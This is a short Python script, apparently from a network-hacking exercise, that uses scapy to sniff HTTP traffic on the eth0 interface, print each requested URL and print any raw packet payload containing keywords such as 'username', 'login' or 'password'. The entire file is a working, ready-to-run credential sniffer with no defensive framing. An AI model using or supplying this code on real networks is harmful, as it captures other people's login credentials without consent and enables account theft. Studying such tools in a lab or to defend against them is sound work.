#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        print(url)
        # Show() displays all the OSI layers in the packet
        # print(packet.show())
        # Scapy.Raw allows to get only the payload layer
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "uname", "login", "pass", "password"]
            for keyword in keywords:
                if keyword in str(load):
                    print(load)
                    break


sniff("eth0")

